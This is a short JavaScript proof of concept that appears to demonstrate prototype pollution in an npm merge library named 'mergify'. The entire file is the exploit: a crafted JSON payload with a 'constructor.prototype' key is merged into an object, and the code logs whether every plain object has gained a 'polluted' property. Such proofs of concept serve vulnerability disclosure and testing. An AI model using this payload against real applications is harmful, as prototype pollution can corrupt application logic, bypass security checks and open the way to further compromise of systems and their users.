var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const mergify = require('mergify');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
mergify(obj, JSON.parse(payload));
console.log({}.polluted);